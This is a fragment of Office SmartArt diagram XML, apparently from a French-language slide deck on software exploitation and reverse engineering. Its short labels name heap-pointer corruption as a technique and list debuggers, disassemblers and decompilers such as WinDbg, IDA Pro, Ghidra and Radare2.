    <dgm:pt modelId="{6E299B5A-3BF2-476B-BC2C-87A65F03EF65}" type="sibTrans" cxnId="{C6D61F56-2589-4D36-BCA7-9424BC6087BC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C025D482-7CD8-4088-A959-CCFB6C206EA1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Impact :Rend les shellcodes classiques inutilisables.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BD14E6CA-61BF-4D72-9B7B-4087B1565ABB}" type="parTrans" cxnId="{355618EA-DEA5-4A4E-8E3D-2981CA49AC28}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{877EA40C-86C6-4EB3-8379-4A1E55B10A17}" type="sibTrans" cxnId="{355618EA-DEA5-4A4E-8E3D-2981CA49AC28}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{66F89D23-6262-8648-BAB2-F4CFDDB6214A}" type="pres">
      <dgm:prSet presAssocID="{D67971B6-3817-4FA2-9270-F51FD5582BB9}" presName="Name0" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EB1B06EE-9EB5-BC4E-A179-9EE1D579FA8C}" type="pres">
      <dgm:prSet presAssocID="{C025D482-7CD8-4088-A959-CCFB6C206EA1}" presName="boxAndChildren" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DEB8CC87-93EA-684C-9FDB-817F83573E05}" type="pres">
      <dgm:prSet presAssocID="{C025D482-7CD8-4088-A959-CCFB6C206EA1}" presName="parentTextBox" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{70328AB9-5C55-AE43-885E-A97F5A26DF3F}" type="pres">
      <dgm:prSet presAssocID="{6E299B5A-3BF2-476B-BC2C-87A65F03EF65}" presName="sp" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{39E6730D-FAF1-EA40-A20A-B25E6D7E6902}" type="pres">
      <dgm:prSet presAssocID="{F76F2B87-85E8-415A-BC46-08DF77D0B429}" presName="arrowAndChildren" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3F6FC470-31B9-784C-9A82-62C8884C8BE4}" type="pres">
      <dgm:prSet presAssocID="{F76F2B87-85E8-415A-BC46-08DF77D0B429}" presName="parentTextArrow" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{C6D61F56-2589-4D36-BCA7-9424BC6087BC}" srcId="{D67971B6-3817-4FA2-9270-F51FD5582BB9}" destId="{F76F2B87-85E8-415A-BC46-08DF77D0B429}" srcOrd="0" destOrd="0" parTransId="{5E559F2A-301B-4560-A7A5-01A6B9067A44}" sibTransId="{6E299B5A-3BF2-476B-BC2C-87A65F03EF65}"/>
    <dgm:cxn modelId="{FF23568F-7085-714B-9DC4-A707C3EC49EE}" type="presOf" srcId="{D67971B6-3817-4FA2-9270-F51FD5582BB9}" destId="{66F89D23-6262-8648-BAB2-F4CFDDB6214A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{A9430C9F-9637-7544-88AF-4CC4FF9C3A16}" type="presOf" srcId="{C025D482-7CD8-4088-A959-CCFB6C206EA1}" destId="{DEB8CC87-93EA-684C-9FDB-817F83573E05}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{B7647FCF-AB17-1C4A-BA43-27AD14E717BA}" type="presOf" srcId="{F76F2B87-85E8-415A-BC46-08DF77D0B429}" destId="{3F6FC470-31B9-784C-9A82-62C8884C8BE4}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{355618EA-DEA5-4A4E-8E3D-2981CA49AC28}" srcId="{D67971B6-3817-4FA2-9270-F51FD5582BB9}" destId="{C025D482-7CD8-4088-A959-CCFB6C206EA1}" srcOrd="1" destOrd="0" parTransId="{BD14E6CA-61BF-4D72-9B7B-4087B1565ABB}" sibTransId="{877EA40C-86C6-4EB3-8379-4A1E55B10A17}"/>
    <dgm:cxn modelId="{AFC28B1B-C0CD-8C44-B728-B7CC28112EC4}" type="presParOf" srcId="{66F89D23-6262-8648-BAB2-F4CFDDB6214A}" destId="{EB1B06EE-9EB5-BC4E-A179-9EE1D579FA8C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{D2BE6185-8D35-0045-BD70-CBF7D0EAB1FD}" type="presParOf" srcId="{EB1B06EE-9EB5-BC4E-A179-9EE1D579FA8C}" destId="{DEB8CC87-93EA-684C-9FDB-817F83573E05}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{A840BB04-CAC4-214E-9211-567BABD2C908}" type="presParOf" srcId="{66F89D23-6262-8648-BAB2-F4CFDDB6214A}" destId="{70328AB9-5C55-AE43-885E-A97F5A26DF3F}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{177BB88A-C1A5-2148-973C-932C8B9EE2BA}" type="presParOf" srcId="{66F89D23-6262-8648-BAB2-F4CFDDB6214A}" destId="{39E6730D-FAF1-EA40-A20A-B25E6D7E6902}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{D1ED66B4-0964-374D-BEFE-1715D495F431}" type="presParOf" srcId="{39E6730D-FAF1-EA40-A20A-B25E6D7E6902}" destId="{3F6FC470-31B9-784C-9A82-62C8884C8BE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35C4A6D8-8359-4D28-9234-0ACB27D47AB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A983436-82E5-4C08-9283-8F3B10865303}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr b="1"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Techniques :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8A6E3C5D-D95F-4325-94A2-0FDC2B592DB3}" type="parTrans" cxnId="{223CA372-2047-489E-90D8-29D8F78C9051}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1AE86271-06BE-4DCE-8F63-1690B143EA44}" type="sibTrans" cxnId="{223CA372-2047-489E-90D8-29D8F78C9051}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5E89D361-0E7C-4783-A504-5EADC6AD2F6E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Corruption des pointeurs de la heap pour rediriger l’exécution.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1C7430CB-2465-4B12-91D3-AE0D9C957DE0}" type="parTrans" cxnId="{570636E6-4B13-4D9D-B3EE-8FDF9E780E5C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0ED2D994-9551-47C7-B872-59B89FECA4C6}" type="sibTrans" cxnId="{570636E6-4B13-4D9D-B3EE-8FDF9E780E5C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5A126F0E-167F-4465-A856-3D172A3CF495}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Altération des données critiques pour détourner les flux d’exécution.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DE3C2042-3E8A-4364-A5EF-988CCDE02B5C}" type="parTrans" cxnId="{203990D0-6377-43F4-B8CB-10633131C662}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5681D0CF-A7C7-41D5-A36C-E57302973F92}" type="sibTrans" cxnId="{203990D0-6377-43F4-B8CB-10633131C662}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CB49D519-84F4-4B02-A01D-5A353924F8BE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr b="1"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Outils :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CE41667C-65AE-4943-BE20-4D0049F07BFB}" type="parTrans" cxnId="{11969EC3-7153-47F7-A2A6-3BF88F6CB23A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7E0DB226-E86F-4BF7-90DE-3603DE22088D}" type="sibTrans" cxnId="{11969EC3-7153-47F7-A2A6-3BF88F6CB23A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{51878EBA-A843-431A-8E0F-120E369C3BBD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Heap Explorer, WinDbg.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{47D8DFC3-46A0-42BC-953B-B49CE1345DDD}" type="parTrans" cxnId="{EB608569-B387-43D7-9FE0-92C6F3CF0866}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D4C1B8B7-3620-412C-AEE3-862BF0C84082}" type="sibTrans" cxnId="{EB608569-B387-43D7-9FE0-92C6F3CF0866}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E90497B8-1659-4491-9858-9379E656C2EC}" type="pres">
      <dgm:prSet presAssocID="{35C4A6D8-8359-4D28-9234-0ACB27D47AB5}" presName="root" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{603D0FB7-4DBE-4EFC-A87B-96EB2E73053D}" type="pres">
      <dgm:prSet presAssocID="{9A983436-82E5-4C08-9283-8F3B10865303}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3ED66A6E-834C-42D0-992C-D6A5970398DF}" type="pres">
      <dgm:prSet presAssocID="{9A983436-82E5-4C08-9283-8F3B1086530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8F53F72-1565-4CCB-BF83-1B58FF4A8C4F}" type="pres">
      <dgm:prSet presAssocID="{9A983436-82E5-4C08-9283-8F3B10865303}" presName="iconSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{464C896D-B06F-4454-A3A5-B496117E0C07}" type="pres">
      <dgm:prSet presAssocID="{9A983436-82E5-4C08-9283-8F3B10865303}" presName="parTx" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9350714F-4B64-441D-8BAE-C1CB9B21C4E2}" type="pres">
      <dgm:prSet presAssocID="{9A983436-82E5-4C08-9283-8F3B10865303}" presName="txSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A681F59C-C6BB-4AFB-9586-8E74CD801467}" type="pres">
      <dgm:prSet presAssocID="{9A983436-82E5-4C08-9283-8F3B10865303}" presName="desTx" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{62600C17-E104-4502-B09C-B80C5029DFC7}" type="pres">
      <dgm:prSet presAssocID="{1AE86271-06BE-4DCE-8F63-1690B143EA44}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E2F20DE7-7034-461C-94B4-1463370DA87C}" type="pres">
      <dgm:prSet presAssocID="{CB49D519-84F4-4B02-A01D-5A353924F8BE}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B9A6AED8-EA97-493E-86F0-2214FF6301E5}" type="pres">
      <dgm:prSet presAssocID="{CB49D519-84F4-4B02-A01D-5A353924F8B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7BF35CC-1E16-40F1-865D-66E395E31B9F}" type="pres">
      <dgm:prSet presAssocID="{CB49D519-84F4-4B02-A01D-5A353924F8BE}" presName="iconSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A5645F8F-E476-4C34-9359-DF9B8EAA0790}" type="pres">
      <dgm:prSet presAssocID="{CB49D519-84F4-4B02-A01D-5A353924F8BE}" presName="parTx" presStyleLbl="revTx" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1F2A8FF1-F14A-4FB2-8D29-C92B2FB6055D}" type="pres">
      <dgm:prSet presAssocID="{CB49D519-84F4-4B02-A01D-5A353924F8BE}" presName="txSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DEA83E5E-D1D7-4848-938C-9C1DEFD9F196}" type="pres">
      <dgm:prSet presAssocID="{CB49D519-84F4-4B02-A01D-5A353924F8BE}" presName="desTx" presStyleLbl="revTx" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{5E869A12-CCD6-475C-8086-A9C291B4D7C0}" type="presOf" srcId="{5A126F0E-167F-4465-A856-3D172A3CF495}" destId="{A681F59C-C6BB-4AFB-9586-8E74CD801467}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{EB608569-B387-43D7-9FE0-92C6F3CF0866}" srcId="{CB49D519-84F4-4B02-A01D-5A353924F8BE}" destId="{51878EBA-A843-431A-8E0F-120E369C3BBD}" srcOrd="0" destOrd="0" parTransId="{47D8DFC3-46A0-42BC-953B-B49CE1345DDD}" sibTransId="{D4C1B8B7-3620-412C-AEE3-862BF0C84082}"/>
    <dgm:cxn modelId="{223CA372-2047-489E-90D8-29D8F78C9051}" srcId="{35C4A6D8-8359-4D28-9234-0ACB27D47AB5}" destId="{9A983436-82E5-4C08-9283-8F3B10865303}" srcOrd="0" destOrd="0" parTransId="{8A6E3C5D-D95F-4325-94A2-0FDC2B592DB3}" sibTransId="{1AE86271-06BE-4DCE-8F63-1690B143EA44}"/>
    <dgm:cxn modelId="{11969EC3-7153-47F7-A2A6-3BF88F6CB23A}" srcId="{35C4A6D8-8359-4D28-9234-0ACB27D47AB5}" destId="{CB49D519-84F4-4B02-A01D-5A353924F8BE}" srcOrd="1" destOrd="0" parTransId="{CE41667C-65AE-4943-BE20-4D0049F07BFB}" sibTransId="{7E0DB226-E86F-4BF7-90DE-3603DE22088D}"/>
    <dgm:cxn modelId="{203990D0-6377-43F4-B8CB-10633131C662}" srcId="{9A983436-82E5-4C08-9283-8F3B10865303}" destId="{5A126F0E-167F-4465-A856-3D172A3CF495}" srcOrd="1" destOrd="0" parTransId="{DE3C2042-3E8A-4364-A5EF-988CCDE02B5C}" sibTransId="{5681D0CF-A7C7-41D5-A36C-E57302973F92}"/>
    <dgm:cxn modelId="{7759DED1-1E36-4DD2-84DC-1B074A2972AB}" type="presOf" srcId="{CB49D519-84F4-4B02-A01D-5A353924F8BE}" destId="{A5645F8F-E476-4C34-9359-DF9B8EAA0790}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{5046B7D2-9A95-4951-8767-AE62B4375B32}" type="presOf" srcId="{51878EBA-A843-431A-8E0F-120E369C3BBD}" destId="{DEA83E5E-D1D7-4848-938C-9C1DEFD9F196}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{C05384D7-7664-4FD1-9E40-754736DFFA09}" type="presOf" srcId="{35C4A6D8-8359-4D28-9234-0ACB27D47AB5}" destId="{E90497B8-1659-4491-9858-9379E656C2EC}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{570636E6-4B13-4D9D-B3EE-8FDF9E780E5C}" srcId="{9A983436-82E5-4C08-9283-8F3B10865303}" destId="{5E89D361-0E7C-4783-A504-5EADC6AD2F6E}" srcOrd="0" destOrd="0" parTransId="{1C7430CB-2465-4B12-91D3-AE0D9C957DE0}" sibTransId="{0ED2D994-9551-47C7-B872-59B89FECA4C6}"/>
    <dgm:cxn modelId="{FE1100F3-CD4B-4F1B-B417-E1918CFB0971}" type="presOf" srcId="{5E89D361-0E7C-4783-A504-5EADC6AD2F6E}" destId="{A681F59C-C6BB-4AFB-9586-8E74CD801467}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{A81399F7-00F0-4CD6-8DBA-22525B1C9596}" type="presOf" srcId="{9A983436-82E5-4C08-9283-8F3B10865303}" destId="{464C896D-B06F-4454-A3A5-B496117E0C07}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{07A4BFA1-6545-4E2A-A43E-E944EDF94E2E}" type="presParOf" srcId="{E90497B8-1659-4491-9858-9379E656C2EC}" destId="{603D0FB7-4DBE-4EFC-A87B-96EB2E73053D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{E43D9117-82D0-41CF-8EF3-73AB3A99A19A}" type="presParOf" srcId="{603D0FB7-4DBE-4EFC-A87B-96EB2E73053D}" destId="{3ED66A6E-834C-42D0-992C-D6A5970398DF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{C0252C4F-FA92-4A08-AEB2-41E5F2D31BF4}" type="presParOf" srcId="{603D0FB7-4DBE-4EFC-A87B-96EB2E73053D}" destId="{98F53F72-1565-4CCB-BF83-1B58FF4A8C4F}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{AD8B6142-DD40-41F8-AD0E-6372814DA60A}" type="presParOf" srcId="{603D0FB7-4DBE-4EFC-A87B-96EB2E73053D}" destId="{464C896D-B06F-4454-A3A5-B496117E0C07}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{AB4C2246-884E-4BBA-BF2A-5715D613387B}" type="presParOf" srcId="{603D0FB7-4DBE-4EFC-A87B-96EB2E73053D}" destId="{9350714F-4B64-441D-8BAE-C1CB9B21C4E2}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{5D1709C9-B1C3-422F-925E-932E7835AB68}" type="presParOf" srcId="{603D0FB7-4DBE-4EFC-A87B-96EB2E73053D}" destId="{A681F59C-C6BB-4AFB-9586-8E74CD801467}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{1C264C56-4989-4CB8-99E0-69C1AA250463}" type="presParOf" srcId="{E90497B8-1659-4491-9858-9379E656C2EC}" destId="{62600C17-E104-4502-B09C-B80C5029DFC7}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{F65FC824-92ED-4B8C-B4C3-D752C7A2BF28}" type="presParOf" srcId="{E90497B8-1659-4491-9858-9379E656C2EC}" destId="{E2F20DE7-7034-461C-94B4-1463370DA87C}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{A3EAAFCB-25E6-4E00-A38C-DDA640725864}" type="presParOf" srcId="{E2F20DE7-7034-461C-94B4-1463370DA87C}" destId="{B9A6AED8-EA97-493E-86F0-2214FF6301E5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{328319C1-35D9-4C3C-AE3E-CB5D2B8F5AD8}" type="presParOf" srcId="{E2F20DE7-7034-461C-94B4-1463370DA87C}" destId="{57BF35CC-1E16-40F1-865D-66E395E31B9F}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{4687AD9E-FBC4-414D-A083-F2454A11625E}" type="presParOf" srcId="{E2F20DE7-7034-461C-94B4-1463370DA87C}" destId="{A5645F8F-E476-4C34-9359-DF9B8EAA0790}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{127495F3-BC7A-4231-9240-C8332FEC8C76}" type="presParOf" srcId="{E2F20DE7-7034-461C-94B4-1463370DA87C}" destId="{1F2A8FF1-F14A-4FB2-8D29-C92B2FB6055D}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{048BA311-2156-41D8-BFA9-30D19F6C4B44}" type="presParOf" srcId="{E2F20DE7-7034-461C-94B4-1463370DA87C}" destId="{DEA83E5E-D1D7-4848-938C-9C1DEFD9F19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90F2FD3D-A715-4114-A7B1-0DF973CFA8D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5C54C1-79BD-4EA5-B125-449B5A0C1412}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Désassembleurs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9C1C4B3C-1E05-4F89-A0B2-2880B0BBDED6}" type="parTrans" cxnId="{9E4F5C36-E2D7-4406-B7B3-A4A47F580B6D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3AD31676-8E06-4C56-98F7-89A64F6C917B}" type="sibTrans" cxnId="{9E4F5C36-E2D7-4406-B7B3-A4A47F580B6D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B5B110F3-3D7A-4990-A364-FB9193294D61}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>IDA Pro, Ghidra, Radare2.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C818E6D1-6468-4F06-B53F-B062493520A4}" type="parTrans" cxnId="{2268FA40-E92D-45F3-860C-D5AB9A6415F1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FC2AD8F9-0B0A-42FA-BBE3-80FCBF8AF3A1}" type="sibTrans" cxnId="{2268FA40-E92D-45F3-860C-D5AB9A6415F1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Décompilateurs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A30C7FBA-AFE0-4660-B6A2-4A3A38B7DC1E}" type="parTrans" cxnId="{CCEE4EDA-2980-4C25-B266-EDBB113361E9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1F5E499A-FE7A-4B27-8F0E-B5255EA9E6B3}" type="sibTrans" cxnId="{CCEE4EDA-2980-4C25-B266-EDBB113361E9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7C489AF3-FD0F-4196-BAD1-25A9E8F8DA9E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Ghidra, IDA Hex-Rays.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
